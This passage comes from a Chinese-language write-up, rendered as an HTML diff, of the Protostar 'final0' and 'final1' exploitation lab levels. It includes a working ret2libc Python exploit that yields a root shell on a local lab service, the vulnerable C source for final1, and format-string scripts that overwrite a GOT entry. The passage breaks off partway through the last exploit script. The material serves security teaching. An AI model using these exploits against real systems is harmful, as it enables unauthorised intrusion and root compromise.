+<span class="o">(</span>gdb<span class="o">)</span> x/s 0x080484b0
+0x80484b0:   <span class="s2">&quot;/bin/sh&quot;</span>
+</code></pre></div>
+</li>
+<li>
+<p>获取 <code>/bin/sh</code> 在 libc 中的偏移</p>
+<div class="highlight"><pre><span></span><code>$ ldd execve_example    <span class="c1"># get paths to all loaded libraries</span>
+    linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0xb7fe4000<span class="o">)</span>
+    libc.so.6 <span class="o">=</span>&gt; /lib/libc.so.6 <span class="o">(</span>0xb7e99000<span class="o">)</span>
+    /lib/ld-linux.so.2 <span class="o">(</span>0xb7fe5000<span class="o">)</span>
+$ grep -a -b -o /bin/sh /lib/libc.so.6
+<span class="m">1176511</span>:/bin/sh
+<span class="c1"># -a, --text                equivalent to --binary-files=text</span>
+<span class="c1"># -b, --byte-offset         print the byte offset with output lines</span>
+<span class="c1"># -o, --only-matching       show only the part of a line matching PATTERN</span>
+</code></pre></div>
+</li>
+<li>
+<p>查看 libc 的起始地址</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># pidof final0</span>
+<span class="m">1514</span>
+<span class="c1"># cat /proc/1514/maps</span>
+<span class="m">08048000</span>-0804a000 r-xp <span class="m">00000000</span> <span class="m">00</span>:10 <span class="m">2220</span>       /opt/protostar/bin/final0
+0804a000-0804b000 rwxp <span class="m">00001000</span> <span class="m">00</span>:10 <span class="m">2220</span>       /opt/protostar/bin/final0
+b7e96000-b7e97000 rwxp <span class="m">00000000</span> <span class="m">00</span>:00 <span class="m">0</span> 
+b7e97000-b7fd5000 r-xp <span class="m">00000000</span> <span class="m">00</span>:10 <span class="m">759</span>        /lib/libc-2.11.2.so
+b7fd5000-b7fd6000 ---p 0013e000 <span class="m">00</span>:10 <span class="m">759</span>        /lib/libc-2.11.2.so
+b7fd6000-b7fd8000 r-xp 0013e000 <span class="m">00</span>:10 <span class="m">759</span>        /lib/libc-2.11.2.so
+b7fd8000-b7fd9000 rwxp <span class="m">00140000</span> <span class="m">00</span>:10 <span class="m">759</span>        /lib/libc-2.11.2.so
+b7fd9000-b7fdc000 rwxp <span class="m">00000000</span> <span class="m">00</span>:00 <span class="m">0</span> 
+b7fe0000-b7fe2000 rwxp <span class="m">00000000</span> <span class="m">00</span>:00 <span class="m">0</span> 
+b7fe2000-b7fe3000 r-xp <span class="m">00000000</span> <span class="m">00</span>:00 <span class="m">0</span>          <span class="o">[</span>vdso<span class="o">]</span>
+b7fe3000-b7ffe000 r-xp <span class="m">00000000</span> <span class="m">00</span>:10 <span class="m">741</span>        /lib/ld-2.11.2.so
+b7ffe000-b7fff000 r-xp 0001a000 <span class="m">00</span>:10 <span class="m">741</span>        /lib/ld-2.11.2.so
+b7fff000-b8000000 rwxp 0001b000 <span class="m">00</span>:10 <span class="m">741</span>        /lib/ld-2.11.2.so
+bffeb000-c0000000 rwxp <span class="m">00000000</span> <span class="m">00</span>:00 <span class="m">0</span>          <span class="o">[</span>stack<span class="o">]</span>
+</code></pre></div>
+</li>
+</ul>
+<h3 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">telnetlib</span>
+
+<span class="n">padding</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">512</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="s1">&#39;aaaabbbbccccdddd&#39;</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">2995</span><span class="p">))</span>
+
+<span class="n">execve</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x08048c0c</span><span class="p">)</span>
+<span class="n">binsh</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mi">1176511</span> <span class="o">+</span> <span class="mh">0xb7e97000</span><span class="p">)</span>
+<span class="n">exploit</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">execve</span> <span class="o">+</span> <span class="s1">&#39;RETA&#39;</span> <span class="o">+</span> <span class="n">binsh</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">8</span>
+
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">exploit</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+
+<span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
+<span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
+<span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span> <span class="c1"># 使用 telnetlib 切换到交互模式</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>$ python final.py 
+id
+<span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span>
+whoami
+root
+<span class="nb">exit</span>
+*** Connection closed by remote host ***
+</code></pre></div>
+<h2 id="final-1">Final 1<a class="headerlink" href="#final-1" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>The ‘already written’ bytes can be variable, and is based upon the length of the IP address and port number.</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&quot;../common/common.c&quot;</span><span class="cp"></span>
+
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;syslog.h&gt;</span><span class="cp"></span>
+
+<span class="cp">#define NAME &quot;final1&quot;</span>
+<span class="cp">#define UID 0</span>
+<span class="cp">#define GID 0</span>
+<span class="cp">#define PORT 2994</span>
+
+<span class="kt">char</span><span class="w"> </span><span class="n">username</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span><span class="w"></span>
+<span class="kt">char</span><span class="w"> </span><span class="n">hostname</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span><span class="w"></span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">logit</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">pw</span><span class="p">)</span><span class="w"></span>
+<span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span><span class="w"></span>
+
+<span class="w">  </span><span class="n">snprintf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span><span class="w"> </span><span class="s">&quot;Login from %s as [%s] with password [%s]</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">hostname</span><span class="p">,</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">pw</span><span class="p">);</span><span class="w"></span>
+
+<span class="w">  </span><span class="n">syslog</span><span class="p">(</span><span class="n">LOG_USER</span><span class="o">|</span><span class="n">LOG_DEBUG</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="c1">// void syslog(int priority, const char *format, ...);</span>
+<span class="w">  </span><span class="c1">// buf is the format string! 0v0</span>
+<span class="p">}</span><span class="w"></span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">trim</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">str</span><span class="p">)</span><span class="w"></span>
+<span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">q</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">  </span><span class="n">q</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strchr</span><span class="p">(</span><span class="n">str</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;\r&#39;</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">q</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="n">q</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="n">q</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strchr</span><span class="p">(</span><span class="n">str</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;\n&#39;</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">q</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="n">q</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">parser</span><span class="p">()</span><span class="w"></span>
+<span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">line</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span><span class="w"></span>
+
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[final1] $ &quot;</span><span class="p">);</span><span class="w"></span>
+
+<span class="w">  </span><span class="k">while</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">)</span><span class="mi">-1</span><span class="p">,</span><span class="w"> </span><span class="n">stdin</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">      </span><span class="n">trim</span><span class="p">(</span><span class="n">line</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;username &quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">9</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">          </span><span class="n">strcpy</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">line</span><span class="o">+</span><span class="mi">9</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;login &quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">6</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">          </span><span class="k">if</span><span class="p">(</span><span class="n">username</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">              </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;invalid protocol</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">          </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">              </span><span class="n">logit</span><span class="p">(</span><span class="n">line</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">6</span><span class="p">);</span><span class="w"></span>
+<span class="w">              </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;login failed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">          </span><span class="p">}</span><span class="w"></span>
+<span class="w">      </span><span class="p">}</span><span class="w"></span>
+<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[final1] $ &quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">getipport</span><span class="p">()</span><span class="w"></span>
+<span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">l</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">sockaddr_in</span><span class="w"> </span><span class="n">sin</span><span class="p">;</span><span class="w"></span>
+<span class="c1">//   struct sockaddr_in {</span>
+<span class="c1">//     sa_family_t    sin_family; /* address family: AF_INET */</span>
+<span class="c1">//     in_port_t      sin_port;   /* port in network byte order */</span>
+<span class="c1">//     struct in_addr sin_addr;   /* internet address */</span>
+<span class="c1">//   };</span>
+
+<span class="c1">//   /* Internet address. */</span>
+<span class="c1">//   struct in_addr {</span>
+<span class="c1">//     uint32_t       s_addr;     /* address in network byte order */</span>
+<span class="c1">//   };</span>
+
+<span class="w">  </span><span class="n">l</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">sockaddr_in</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="c1">// int getpeername(int sockfd, struct sockaddr *addr, socklen_t *addrlen);</span>
+<span class="w">  </span><span class="c1">// getpeername()  returns  the address of the peer connected to the socket sockfd, in the buffer pointed to by addr.</span>
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">getpeername</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">l</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">-1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">      </span><span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;you don&#39;t exist&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+
+<span class="w">  </span><span class="n">sprintf</span><span class="p">(</span><span class="n">hostname</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;%s:%d&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">inet_ntoa</span><span class="p">(</span><span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">),</span><span class="w"> </span><span class="n">ntohs</span><span class="p">(</span><span class="n">sin</span><span class="p">.</span><span class="n">sin_port</span><span class="p">));</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">envp</span><span class="p">)</span><span class="w"></span>
+<span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">username</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">  </span><span class="cm">/* Run the process as a daemon */</span><span class="w"></span>
+<span class="w">  </span><span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span><span class="w"> </span><span class="n">UID</span><span class="p">,</span><span class="w"> </span><span class="n">GID</span><span class="p">);</span><span class="w"> </span>
+
+<span class="w">  </span><span class="cm">/* Wait for socket activity and return */</span><span class="w"></span>
+<span class="w">  </span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span><span class="w"></span>
+
+<span class="w">  </span><span class="cm">/* Set the client socket to STDIN, STDOUT, and STDERR */</span><span class="w"></span>
+<span class="w">  </span><span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span><span class="w"></span>
+
+<span class="w">  </span><span class="n">getipport</span><span class="p">();</span><span class="w"></span>
+<span class="w">  </span><span class="n">parser</span><span class="p">();</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+<ul>
+<li>
+<p>正确使用 <code>login</code> 后可以在 <code>/var/log/syslog</code> 中看到登录尝试日志<br>
+<img alt="Login from 127.0.0.1:34101 as [yanhui] with password [test]" src="../img/final0.jpg" /></p>
+</li>
+<li>
+<p>看上去似乎没有可控制的 <code>printf</code>，但 <code>syslog</code> 类似于 <code>printf</code>，第二个参数为格式化字符串，因而可以通过 <code>username</code> 和 <code>pw</code> 来控制，接下来可以修改 <code>strncmp</code> 函数 GOT 表的条目地址</p>
+</li>
+<li>
+<p>获取 <code>strncmp</code> 函数 GOT 表的条目地址</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># gdb --pid `pidof final1`</span>
+<span class="o">(</span>gdb<span class="o">)</span> info functions strncmp
+All functions matching regular expression <span class="s2">&quot;strncmp&quot;</span>:
+
+File strncmp.c:
+int *__GI_strncmp<span class="o">(</span>const char *, const char *, size_t<span class="o">)</span><span class="p">;</span>
+
+File ../sysdeps/i386/i486/bits/string.h:
+int __strncmp_g<span class="o">(</span>const char *, const char *, size_t<span class="o">)</span><span class="p">;</span>
+
+Non-debugging symbols:
+0x08048d9c  strncmp
+0x08048d9c  strncmp@plt
+Current language:  auto
+The current <span class="nb">source</span> language is <span class="s2">&quot;auto; currently asm&quot;</span>.
+<span class="o">(</span>gdb<span class="o">)</span> x/2i 0x08048d9c
+0x8048d9c &lt;strncmp@plt&gt;:    jmp    *0x804a1a8
+0x8048da2 &lt;strncmp@plt+6&gt;:  push   <span class="nv">$0</span>x160
+<span class="o">(</span>gdb<span class="o">)</span> x/wx 0x804a1a8
+0x804a1a8 &lt;_GLOBAL_OFFSET_TABLE_+188&gt;:  0x08048da2
+</code></pre></div>
+</li>
+<li>
+<p>获取 <code>system</code> 函数的地址</p>
+<ul>
+<li>
+<blockquote>
+<p>On a real modern system you would first have to leak addresses from memory in order to calculate offsets and break ASLR</p>
+</blockquote>
+</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span> x system  <span class="c1"># part of libc</span>
+0xb7ecffb0 &lt;__libc_system&gt;: 0x890cec83
+</code></pre></div>
+</li>
+<li>
+<p>观察输入字符串在栈中的位置</p>
+<div class="highlight"><pre><span></span><code>$ nc <span class="m">127</span>.0.0.1 <span class="m">2994</span>
+<span class="o">[</span>final1<span class="o">]</span> $ username AAAA %x %x %x %x %x %x %x %x
+<span class="o">[</span>final1<span class="o">]</span> $ login BBBB %x %x %x %x %x %x %x %x
+login failed
+<span class="o">[</span>final1<span class="o">]</span> $ ^C
+</code></pre></div>
+<p><img alt="tail -n 5 /var/log/syslog" src="../img/final1.jpg" /></p>
+</li>
+<li>
+<p>最短 <code>hostname</code> 为 <code>x.x.x.x:x</code>（长度为 <span class="arithmatex">\(9\)</span>），最长 <code>hostname</code> 为 <code>xxx.xxx.xxx.xxx:xxxxx</code>（长度为 <span class="arithmatex">\(21\)</span>），为了对齐，需要进行填充，根据 <code>hostname</code> 的长度范围可以统一填充到 <span class="arithmatex">\(24\)</span> 字节，这样一来就可以固定写入第 <span class="arithmatex">\(17\)</span> 个参数所指向的地址</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">struct</span>
+
+<span class="k">def</span> <span class="nf">read_util</span><span class="p">(</span><span class="n">check</span><span class="p">):</span>
+    <span class="n">buf</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+    <span class="k">while</span> <span class="n">check</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
+        <span class="n">buf</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">buf</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">2994</span><span class="p">))</span>
+
+<span class="n">ip</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">getsockname</span><span class="p">()</span>
+<span class="n">hostname</span> <span class="o">=</span> <span class="n">ip</span> <span class="o">+</span> <span class="s1">&#39;:&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">port</span><span class="p">)</span> <span class="c1"># 降低变长 hostname 的影响</span>
+<span class="n">pad</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">24</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">hostname</span><span class="p">))</span>
+<span class="n">username</span> <span class="o">=</span> <span class="n">pad</span> <span class="o">+</span> <span class="s1">&#39;BBBB&#39;</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="si">%08x</span><span class="s1"> &#39;</span> <span class="o">*</span> <span class="mi">20</span>
+<span class="n">login</span> <span class="o">=</span> <span class="s1">&#39;CCCC&#39;</span>
+
+<span class="nb">print</span> <span class="n">read_util</span><span class="p">(</span><span class="s1">&#39;[final1] $&#39;</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;username &#39;</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="nb">print</span> <span class="n">read_util</span><span class="p">(</span><span class="s1">&#39;[final1] $&#39;</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;login &#39;</span> <span class="o">+</span> <span class="n">login</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="nb">print</span> <span class="n">read_util</span><span class="p">(</span><span class="s1">&#39;[final1] $&#39;</span><span class="p">)</span>
+</code></pre></div>
+<p><img alt="BBBB 对应第 17 个参数" src="../img/final2.jpg" /></p>
+</li>
+<li>
+<p>接下来查看已打印字符数量，并确定剩余需要字符的数量</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">struct</span>
+
+<span class="k">def</span> <span class="nf">read_util</span><span class="p">(</span><span class="n">check</span><span class="p">):</span>
+    <span class="n">buf</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+    <span class="k">while</span> <span class="n">check</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
+        <span class="n">buf</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">buf</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">2994</span><span class="p">))</span>
+
+<span class="n">strncmp</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;I&#39;</span><span class="p">,</span> <span class="mh">0x804a1a8</span><span class="p">)</span>
+<span class="n">ip</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">getsockname</span><span class="p">()</span>
+<span class="n">hostname</span> <span class="o">=</span> <span class="n">ip</span> <span class="o">+</span> <span class="s1">&#39;:&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">port</span><span class="p">)</span>
+<span class="n">pad</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">24</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">hostname</span><span class="p">))</span>
+<span class="n">username</span> <span class="o">=</span> <span class="n">pad</span> <span class="o">+</span> <span class="s1">&#39;BBBB&#39;</span> <span class="o">+</span> <span class="n">strncmp</span> <span class="o">+</span> <span class="s1">&#39;%18$n&#39;</span>
+<span class="n">login</span> <span class="o">=</span> <span class="s1">&#39;CCCC&#39;</span>
+
+<span class="nb">print</span> <span class="n">read_util</span><span class="p">(</span><span class="s1">&#39;[final1] $&#39;</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;username &#39;</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="nb">print</span> <span class="n">read_util</span><span class="p">(</span><span class="s1">&#39;[final1] $&#39;</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;login &#39;</span> <span class="o">+</span> <span class="n">login</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="nb">print</span> <span class="n">read_util</span><span class="p">(</span><span class="s1">&#39;[final1] $&#39;</span><span class="p">)</span>
+<span class="n">raw_input</span><span class="p">(</span><span class="s1">&#39;waiting... hit [enter]&#39;</span><span class="p">)</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>$ python final.py 
+<span class="o">[</span>final1<span class="o">]</span> $
+<span class="o">[</span>final1<span class="o">]</span> $
+login failed
+<span class="o">[</span>final1<span class="o">]</span> $
+waiting... hit <span class="o">[</span>enter<span class="o">]</span>
+
+<span class="c1"># open another terminal</span>
+<span class="c1"># pidof final1</span>
+<span class="m">21600</span> <span class="m">1516</span>
+<span class="c1"># gdb --pid 21600</span>
+<span class="o">(</span>gdb<span class="o">)</span> x/wx 0x804a1a8
+0x804a1a8 &lt;_GLOBAL_OFFSET_TABLE_+188&gt;:  0x00000030
+Current language:  auto
+The current <span class="nb">source</span> language is <span class="s2">&quot;auto; currently asm&quot;</span>.
+</code></pre></div>
+</li>
+</ul>
+<h3 id="exploit_1">Exploit<a class="headerlink" href="#exploit_1" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">telnetlib</span>
+
+<span class="k">def</span> <span class="nf">read_util</span><span class="p">(</span><span class="n">check</span><span class="p">):</span>
+    <span class="n">buf</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+    <span class="k">while</span> <span class="n">check</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
+        <span class="n">buf</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">buf</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">2994</span><span class="p">))</span>
+
+<span class="n">strncmp_got</span> <span class="o">=</span> <span class="mh">0x804a1a8</span>
+
+<span class="n">ip</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">getsockname</span><span class="p">()</span>
+<span class="n">hostname</span> <span class="o">=</span> <span class="n">ip</span> <span class="o">+</span> <span class="s1">&#39;:&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">port</span><span class="p">)</span>
